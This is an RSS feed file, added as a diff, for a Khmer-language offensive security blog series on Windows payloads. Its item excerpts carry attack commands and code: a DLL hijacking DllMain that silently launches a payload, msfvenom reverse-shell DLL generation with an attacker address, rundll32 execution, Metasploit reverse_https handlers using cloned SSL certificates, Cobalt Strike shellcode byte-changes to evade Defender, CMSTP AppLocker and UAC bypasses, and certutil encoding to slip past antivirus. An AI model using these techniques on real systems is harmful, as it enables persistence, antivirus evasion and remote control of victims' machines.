@@ -1,0 +1,391 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" 
+  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
+  xmlns:dc="http://purl.org/dc/elements/1.1/" 
+  xmlns:atom="http://www.w3.org/2005/Atom" 
+  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
+  xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>WinExE on ThikLab - CyberSec</title>
+    <link>https://thiklab.com/en/series/winexe/</link>
+    <description>Recent content in WinExE on ThikLab - CyberSec</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <managingEditor>thiklife403@gmail.com (Thik)</managingEditor>
+    <webMaster>thiklife403@gmail.com (Thik)</webMaster>
+    <copyright><a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'><img alt='Creative Commons License' style='border-width:0;display:block;margin-left:auto;margin-right:auto;' src='https://i.creativecommons.org/l/by-sa/4.0/88x31.png' /></a>©2020 - 2022 All content is licensed under <a rel='license' target='_blank' href='http://creativecommons.org/licenses/by-sa/4.0/'>CC BY-SA</a>.</copyright>
+    <lastBuildDate>Tue, 06 Dec 2022 21:01:06 +0700</lastBuildDate>
+    
+        <atom:link href="https://thiklab.com/en/series/winexe/index.xml" rel="self" type="application/rss+xml" />
+    
+
+      
+      <item>
+        <title>DLL Hijacking - Persistence Method</title>
+        <link>https://thiklab.com/en/posts/dll-hijacking-persistence-method/</link>
+        <pubDate>Tue, 06 Dec 2022 21:01:06 +0700</pubDate>
+        <author>thiklife403@gmail.com (Thik)</author>
+        <atom:modified>Tue, 06 Dec 2022 21:01:06 +0700</atom:modified>
+        <guid>https://thiklab.com/en/posts/dll-hijacking-persistence-method/</guid>
+        <description>C - Execute Command Prompt ចម្លងកូដ និង កែប្រែទីតាំងរបស់ Payload​ ។
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  #include &amp;lt;windows.h&amp;gt;using namespace std; void exec() { WinExec(&amp;#34;cmd.exe /c c:\\programdata\\putty.exe&amp;#34;, 0); } BOOL WINAPI DllMain (HANDLE hDLL, DWORD dwReason, LYVOID lpReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: exec(); break; } return TRUE; }  
+DLL Build ចូលទៅកាន់ផ្ទាំង Terminal ក្នុងប្រព័ន្ធប្រតិបត្តិការលីនុច រួចវាយពាក្យបញ្ជាដូខខាងក្រោម៖
+1 2 3 4 5 6 7 8  // To create Windows executables, you need to instsall mingw cross-compiler sudo apt-get install mingw-w64 //For x64 compile with: x86_64-w64-mingw32-gcc r4t.</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>dll</category>
+            
+          
+            
+              <category>reverse-shell</category>
+            
+          
+            
+              <category>persistence</category>
+            
+          
+        
+        
+        
+          
+            
+              <category>WinExE</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>1 Byte Changed Evading Win Defender</title>
+        <link>https://thiklab.com/en/posts/av-evading-1-byte-change/</link>
+        <pubDate>Sat, 03 Dec 2022 21:01:06 +0700</pubDate>
+        <author>thiklife403@gmail.com (Thik)</author>
+        <atom:modified>Sat, 03 Dec 2022 21:01:06 +0700</atom:modified>
+        <guid>https://thiklab.com/en/posts/av-evading-1-byte-change/</guid>
+        <description>1 Byte Evading ដំបូងយើងត្រូវបង្កើត Shell Code ជាប្រភេទភាសារ C នៅក្នុង Cobalt Strike ដូចរូបខាងក្រោម៖
+សូមចាប់អារម្មណ៏ត្រង់ Byte ដំបូងគេនៃ Code គឺ \xfc ។
+តស់!!! មកកែប្រែចំនួន Byte ដូចខាងក្រោម៖
+ប្ដូរ \xfc ទៅជាចំនួនតម្លៃ Byte ផ្សេង។ ឧ. \xfd, \x3a, \x6f\ ។ល។រក្សាតម្លៃដើមដែលត្រឹមត្រូវនៅក្នុង Char Variable = char first[] = &#34;\xfc&#34;;Build ឯកសារ exe ជាមួយកម្មវិធីអានកូដជាការស្រេច។ខាងក្រោមជា Source Code សម្រាប់អ្នកដែលចង់សាកល្បងវិធីសាស្ត្រមួយនេះ៕
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  //payload.</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>reverse-shell</category>
+            
+          
+            
+              <category>c-shellcode</category>
+            
+          
+        
+        
+        
+          
+            
+              <category>WinExE</category>
+            
+          
+            
+              <category>CobaltStrike</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>Impersonate SSL - MSF Bypass Detection</title>
+        <link>https://thiklab.com/en/posts/bypass-detection-msf-shell/</link>
+        <pubDate>Sat, 03 Dec 2022 21:01:06 +0700</pubDate>
+        <author>thiklife403@gmail.com (Thik)</author>
+        <atom:modified>Sat, 03 Dec 2022 21:01:06 +0700</atom:modified>
+        <guid>https://thiklab.com/en/posts/bypass-detection-msf-shell/</guid>
+        <description>Clone SSL Certification តើអ្នកដឹងទេថា យើងអាចធ្វើការថតចម្លងនូវរាល់ឯកសារ SSL Certificate របស់គេហទំព័រដទៃបាន ដោយប្រើប្រាស់ Module មួយនៅក្នុង Metasploit Framework ដែលត្រូវបានបង្កើតឡើងដោយលោក Chris John Riley ។ ឯកសារដែលត្រូវបានថតចម្លងនោះ នឹងត្រូវរក្សាទុកជាប្រភេទទម្រង់ឯកសារ PEM ហើយវាក៏អាចប្រើប្រាស់បានគ្រប់ប្រភេទ Modules នៅក្នុង Metasploit ផងដែរ។
+ដើម្បីថតចម្លង យើងអាចប្រើប្រាស់ពាក្យបញ្ជាដូចខាងក្រោម៖
+1 2 3  use auxiliary/gather/impersonate_ssl set rhosts https://example.com/ exploit   ដូចដែលរូបបានបង្ហាញខាងលើ គឺយើងបានថតចម្លងឯកសារ Certificate បានសម្រេច។
+Meterpreter Using SSL Connection ខាងក្រោមនេះគឺជាការសាកល្បងប្រើប្រាស់ SSL Certificate ដែលបានថតចម្លងនោះមកភ្ជាប់ទំនាក់ទំងរវាង Attacker PC និង Victim PC ដោយប្រើប្រាស់ Reverse Shell ជាប្រភេទ HTTPS ។
+បើកចូលផ្ទាំង Terminal នៃ Metasploit Framework រួចបញ្ចូលពាក្យបញ្ជាដូចខាងក្រោម៖
+1 2 3 4 5 6 7  use exploit/multi/handler set payload windows/x64/meterpreter/reverse_https set lhost 192.</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>metasploit</category>
+            
+          
+            
+              <category>ssl</category>
+            
+          
+            
+              <category>bypass</category>
+            
+          
+            
+              <category>reverse-shell</category>
+            
+          
+        
+        
+          
+            
+              <category>CA</category>
+            
+          
+        
+        
+          
+            
+              <category>WinExE</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>AppLocker Bypass - CMSTP</title>
+        <link>https://thiklab.com/en/posts/applocker-cmstp-bypass/</link>
+        <pubDate>Sat, 03 Dec 2022 02:00:06 +0700</pubDate>
+        <author>thiklife403@gmail.com (Thik)</author>
+        <atom:modified>Sat, 03 Dec 2022 02:00:06 +0700</atom:modified>
+        <guid>https://thiklab.com/en/posts/applocker-cmstp-bypass/</guid>
+        <description>ឯកសារ CMSTP ត្រូវបានរក្សាទុកនៅក្នុងថតឯកសារនៃវីនដូ៖
+1 2  C:\Windows\System32\cmstp.exe C:\Windows\SysWOW64\cmstp.exe   វីធីសាស្ត្រមួយនេះត្រូវបានរកឃើញដោយលោក Oddvar Moe អាចអានលំអិតនៅក្នុង Blog របស់គាត់។
+DLL Metasploit ត្រូវបានប្រើប្រាស់ដើម្បីបង្កើតឯកសារមេរោគ DLL តាមរយៈ MSFvenom ។
+1  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.55 LPORT=4444 -f dll &amp;gt; idm.dll   សម្រាប់ផ្នែក RegisterOCXSection តម្រូវឲ្យដាក់ទីតាំងរបស់ឯកសារ DLL ដែល​បាន​បង្កើត​រួច។
+1 2 3 4 5 6 7 8 9 10 11 12 13 14  [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] RegisterOCXs=RegisterOCXSection [RegisterOCXSection] C:\Users\Victim\idm.dll [Strings] AppAct = &amp;#34;SOFTWARE\Microsoft\Connection Manager&amp;#34; ServiceName=&amp;#34;idm&amp;#34; ShortSvcName=&amp;#34;idm&amp;#34;   រក្សាទុកជា &amp;ldquo;idm-service.</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature3/code-file.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>dll</category>
+            
+          
+            
+              <category>bypass</category>
+            
+          
+            
+              <category>inf</category>
+            
+          
+            
+              <category>sct</category>
+            
+          
+        
+        
+          
+            
+              <category>CMSTP</category>
+            
+          
+        
+        
+          
+            
+              <category>WinExE</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>Bypass UAC DLL Method</title>
+        <link>https://thiklab.com/en/posts/bypass-uac-dll-method/</link>
+        <pubDate>Sat, 03 Dec 2022 02:00:06 +0700</pubDate>
+        <author>thiklife403@gmail.com (Thik)</author>
+        <atom:modified>Sat, 03 Dec 2022 02:00:06 +0700</atom:modified>
+        <guid>https://thiklab.com/en/posts/bypass-uac-dll-method/</guid>
+        <description>ដើម្បីធ្វើការ Bypass ទៅលើ UAC នៅរាល់ប្រព័ន្ធប្រតិបត្តិការវីនដូជំនាន់ថ្មី (៨/១០/១១) យើងអាចប្រើប្រាស់ឯកសារ PS1 ដើម្បីបង្កើតចេញជា dll reflection ដែលអាច Exploit តាមរយៈឯកសារដើម cmstp.exe នៃប្រព័ន្ធគោលពីរ។
+C# DLL Reflection Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100  /* UAC Bypass using CMSTP.</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>dll</category>
+            
+          
+            
+              <category>bypass</category>
+            
+          
+        
+        
+          
+            
+              <category>UAC</category>
+            
+          
+        
+        
+          
+            
+              <category>WinExE</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>Convert ExE To Text File</title>
+        <link>https://thiklab.com/en/posts/convert-exe-to-txt/</link>
+        <pubDate>Thu, 01 Dec 2022 10:01:06 +0700</pubDate>
+        <author>thiklife403@gmail.com (Thik)</author>
+        <atom:modified>Thu, 01 Dec 2022 10:01:06 +0700</atom:modified>
+        <guid>https://thiklab.com/en/posts/convert-exe-to-txt/</guid>
+        <description>ជាគំនិតក្នុងការបំប្លែងប្រភេទ​ឯកសារ Binary Execuable ទៅជាបណ្ដុំតួរអក្សរដែលអាចរក្សាទុកនិងទាញយកពីប្រភពខាងក្រៅបាន។
+Certutil Encode នៅក្នុងប្រព័ន្ធប្រតិបត្តិការវីនដូ សូមបើកផ្ទាំង Command Prompt (CMD) និងវាយបញ្ចូលពាក្យបញ្ជាដូចខាងក្រោម៖
+1  cmd&amp;gt; certutil -encode file.exe file.txt  
+ក្រោយពីបំប្លែងរួច នោះយើងនឹងទទួលបានឯកសារមួយជាប្រភេទ Text ដូចដែលបានបង្ហាញដូចខាងក្រោម៖
+1 2 3 4 5 6 7 8  -----BEGIN CERTIFICATE----- TVp4AAEAAAAEAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA m21gKiFxNcsclCLVL6Q01cECa/UD1Am02MYPaESJirs/s/5l1TKlKGnQQLTZymuI 1ZJiqgSCbkCdi1scpPQEk+IVPuYnVa91h1qWPA4PO/G2K4M7lQqRrGdQ57i3A+yM v+8J1Zx3eaAnAxpg0FDfzyrUVS4Wc45KE9FVEJTyk706+qFXhvey4pGUSFkH1obG g3mE2SaLGbMQPkC95pNe/vfqyQ4MFgulk1HcL9XA3AyprIVj2H0ve91ip0aeIcOC rzno9vOnK3OrUKUVl9CK2s56VsHUAjmreyKs6cyUxfWUDI6is3NxuSR8AAAAAAAA -----END CERTIFICATE-----   Certutil Decode ដើម្បីបំប្លែងត្រលប់ទៅកាន់ឯកសារដើមវិញ យើងអាចវាយពាក្យបញ្ជាចូលទៅក្នុងផ្ទាំង Command Prompt ដូចខាងក្រោម៖
+1  cmd&amp;gt; certutil -decode file.txt file.exe   វិធីសាស្រ្តនេះក៏អាចជាជំនួយក្នុងការ Bypass ទៅលើការចាប់ពីកម្មវិធីកំចាត់មេរោគផងដែ៕
+ប្រភព៖ docs.microsoft.com</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>converter</category>
+            
+          
+            
+              <category>encode</category>
+            
+          
+            
+              <category>decode</category>
+            
+          
+        
+        
+          
+            
+              <category>FUD</category>
+            
+          
+            
+              <category>CA</category>
+            
+          
+        
+        
+          
+            
+              <category>WinExE</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>Execute DLL Payloads</title>
+        <link>https://thiklab.com/en/posts/exec-dll-payload/</link>
+        <pubDate>Tue, 01 Nov 2022 21:01:06 +0700</pubDate>
+        <author>thiklife403@gmail.com (Thik)</author>
+        <atom:modified>Tue, 01 Nov 2022 21:01:06 +0700</atom:modified>
+        <guid>https://thiklab.com/en/posts/exec-dll-payload/</guid>
+        <description>Generate DLL Payload នៅក្នុងប្រព័ន្ធប្រតិបត្តិការលីនុច (Kali, Parrot) សូមបើកផ្ទាំង Terminal ហើយបញ្ចូលពាក្យបញ្ជាដូចខាងក្រោម៖
+1  kali@1337:~$ msfvenom -p windows/meterpreter/reverse_tcp lhost=128.x.x.x lport=4455 -b &amp;#39;\x00\xff&amp;#39; -f dll &amp;gt; idm.dll   Execute DLL ឥឡូវចូលទៅកាន់ម៉ាស៊ីនវីនដូ ហើយវាយពាក្យបញ្ជាដូចខាងក្រោម៖
+1  cmd&amp;gt; c:\Windows\System32\rundll32.exe c:\Users\Zyzz\Desktop\idm32.dll,xoxo   ល្បិចក្នុងការដំណើរការ DLL គឺស្ថិតនៅត្រង់សញ្ញា &amp;quot;,&amp;quot; ហើយបញ្ចប់ដោយតួរអក្សរពីក្រោយ (ដាក់អ្វីក៏បាន)។
+Get Reverse Shell តស់! ត្រលប់ទៅកាន់ផ្ទាំង Terminal វិញនោះយើងនឹងទទួលបាន Reverse Shell ពីវីនដូ៕</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature2/article-1.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>dll</category>
+            
+          
+            
+              <category>reverse-shell</category>
+            
+          
+        
+        
+          
+            
+              <category>Metasploit</category>
+            
+          
+        
+        
+          
+            
+              <category>WinExE</category>
+            
+          
+        
+      </item>
+      
+      <item>
+        <title>Self Signed Certification</title>
+        <link>https://thiklab.com/en/posts/self-signed-certification/</link>
+        <pubDate>Tue, 02 Jun 2020 16:22:34 +0700</pubDate>
+        <author>thiklife403@gmail.com (Thik)</author>
+        <atom:modified>Tue, 02 Jun 2020 16:22:34 +0700</atom:modified>
+        <guid>https://thiklab.com/en/posts/self-signed-certification/</guid>
+        <description>តើមានវិធីអ្វីដែលអាចចុះហត្ថលេខាលើកូដទៅឲ្យកម្មវិធី ឫ Payload ដែលយើងបានបង្កើតឡើងដោយខ្លួនឯងរួច?
+ខាងក្រោមនេះគឺជាវិធីដ៏ល្អមួយសម្រាប់ចម្លើយនៃសំនួរខាងលើ៖
+Generate the Key 1 2  # Make sure you run as Administrator New-SelfSignedCertificate -DnsName email@yourdomain.com -Type CodeSigning -CertStoreLocation cert:\CurrentUser\My   Export Certification Without Private Key 1  Export-Certificate -Cert (Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert)[0] -FilePath code_signing.crt   ចំពោះលេខ [0] គឺសម្រាប់ករណីនៅពេលដែលយើងមាន Certificate ច្រើនជាងមួយ។
+Import as Trusted Publisher 1  Import-Certificate -FilePath .\code_signing.crt -Cert Cert:\CurrentUser\TrustedPublisher   Import as Root Certificate Authority 1  Import-Certificate -FilePath .</description>
+        
+        <dc:creator>thik</dc:creator>
+        <media:content url="https://thiklab.comimages/feature3/ca.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        
+        
+          
+            
+              <category>code-signing</category>
+            
+          
+        
+        
+          
+            
+              <category>CA</category>
+            
+          
+        
+        
+          
+            
+              <category>WinExE</category>
+            
+          
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
